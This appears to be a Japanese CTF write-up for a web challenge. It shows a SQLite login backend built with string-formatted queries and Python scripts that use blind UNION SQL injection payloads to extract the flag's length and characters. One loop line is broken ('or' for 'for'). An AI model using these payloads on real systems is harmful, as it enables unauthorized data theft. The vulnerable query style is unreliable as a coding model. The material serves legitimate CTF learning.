# [secret-table-3] Writeup
日付: 2026-07-10
カテゴリ: web

---

##  問題概要
今日の問題は webの問題で、  
SQLインジェクションを用いてデータベースの値を入手することがゴールだった。

問題文は公開しないが、与えられた情報は以下のような内容だった：
```HTML
    <h1>Login</h1>
    <p> There are three users: alpaca, guest and admin. </p>
    <form id="login-form">
      <label for="username">Username</label>
      <input name="username" placeholder="alpaca" required>
      <label for="password">Password</label>
      <input name="password" required>
      <button type="submit" id="login-btn">Login</button>
    </form>
    <h6>Executed SQL:</h6>
    <pre><code id="sql"></code></pre>
    <h6>Response:</h6>
    <pre><code id="code"></code></pre>
  </main>
```
- ユーザ名とパスワードを入力できるログイン画面
- 実行されるSQL文が表示される
- また、ログインの結果が表示される
- SQLのテーブルは二つ作成されるがログインに関与しているのは1つだけ

```python
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password TEXT NOT NULL
        );
        """)
    for username, password in USERS.items():
        conn.execute(f"""
            INSERT OR IGNORE INTO users (username, password) VALUES ('{username}', '{password}');
            """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS secret (
            flag TEXT PRIMARY KEY
        );
        """)
```

---

##  解法の方針
1. **[flgaの文字の長さを取得する]**  
   - そのままでは文字の長さは取得できないので、文字の長さを変えてSQL文の応答でチェックする。
   - where length(flag) = {length}で右辺のlengthの値を1からnまで変える
   - 長さが一致するとSQLが通り、ログインが成功するが、長さが異なっているとエラー文が返ってくる。

2. **[1文字ずつflgaの値をチェックする]**  
   - 記号や数字、英字が含まれているセットを作成して、1文字ずつ一致するか確かめる。
   - substr(flag, {i},1)= '{c}'でi番目の文字1文字がcと一致するならTrue。



##  実装（自分で書いたコード）
今回使用したコードの抜粋：
1. **[flgaの文字の長さを取得する]** 
```python
# length.py
    payload =  f"' UNION SELECT flag, 1 from secret where length(flag) = {length}--"
    response = requests.post(
        url,
        data={
        "username": "admin",
        "password": payload
        }
    )

    print(response.text)
    if "Hello, user!" in response.text:
        answer =  length
        break
```

2. **[1文字ずつflgaの値をチェックする]**  
```python
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#"
or i in range(1,50):
    for c in charset:
        payload =  f"' UNION SELECT flag, 1 from secret where substr(flag, {i},1)= '{c}'--"
        response = requests.post(
            url,
            data={
            "username": "admin",
            "password": payload
            }
        )

        print(response.text)
        if "Hello, user!" in response.text:#ログインできた時、リストに文字を追加する
            answer[i] = c
```
